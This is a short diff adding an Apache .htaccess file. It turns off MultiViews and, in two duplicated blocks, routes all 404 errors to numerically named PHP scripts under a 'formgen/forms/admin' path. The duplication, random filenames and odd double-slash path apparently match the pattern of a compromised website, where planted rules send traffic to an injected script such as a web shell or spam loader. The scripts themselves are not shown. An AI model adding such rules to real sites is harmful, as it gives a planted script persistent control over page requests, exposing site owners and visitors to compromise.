@@ -1,0 +1,6 @@
+
+Options -MultiViews
+ErrorDocument 404 //formgen/forms/admin/90615.php
+
+Options -MultiViews
+ErrorDocument 404 //formgen/forms/admin/66371.php
